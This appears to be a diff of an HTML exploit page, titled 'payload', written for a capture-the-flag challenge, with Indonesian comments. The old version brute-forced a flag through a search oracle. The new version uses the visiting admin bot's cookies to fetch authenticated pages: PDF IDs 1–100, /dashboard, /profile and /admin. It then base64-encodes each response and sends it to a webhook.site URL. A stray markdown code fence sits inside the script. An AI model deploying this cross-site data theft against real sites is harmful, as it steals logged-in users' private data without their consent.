@@ -1,42 +1,65 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>payload</title>
+</head>
+<body>
 <script>
-const TARGET = "/search?q=";
-const LOGGER = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
-const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
+const WEBHOOK = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
 
-function log(msg) {
-  fetch(LOGGER + "?d=" + encodeURIComponent(msg)).catch(()=>{});
+// kirim data ke webhook
+function exfil(tag, data) {
+try {
+fetch(WEBHOOK + "?tag=" + encodeURIComponent(tag) + "&d=" + btoa(data));
+} catch(e) {}
 }
 
-async function check(prefix) {
-  try {
-    const res = await fetch(TARGET + encodeURIComponent(prefix));
-    const text = await res.text();
+// ambil halaman dengan cookie admin (bot)
+async function grab(path) {
+try {
+const res = await fetch(path, {
+method: "GET",
+credentials: "include"
+});
 
-    // cek apakah ada hasil
-    return text.includes("<iframe");
-  } catch {
-    return false;
-  }
+```
+const text = await res.text();
+exfil(path, text);
+```
+
+} catch(e) {}
 }
 
-async function solve(prefix) {
-  log("progress: " + prefix);
+async function run() {
 
-  for (const c of ALPHABET) {
-    const attempt = prefix + c;
+// test basic
+await grab("/");
+await grab("/search?q=");
 
-    if (await check(attempt)) {
-      log("found: " + attempt);
-
-      if (c === '}') {
-        log("FLAG: " + attempt);
-        return;
-      }
-
-      return solve(attempt);
-    }
-  }
+// brute PDF ID (TARGET UTAMA)
+for (let i = 1; i <= 100; i++) {
+await grab("/pdfs/" + i);
 }
 
-solve("CBD{");
-</script>
+// coba raw file
+for (let i = 1; i <= 100; i++) {
+await grab("/pdfs/" + i + "/raw");
+}
+
+// alternatif path
+for (let i = 1; i <= 100; i++) {
+await grab("/index.php/pdfs/" + i);
+}
+
+// endpoint tambahan
+await grab("/dashboard");
+await grab("/profile");
+await grab("/admin");
+}
+
+run(); </script>
+
+</body>
+</html>
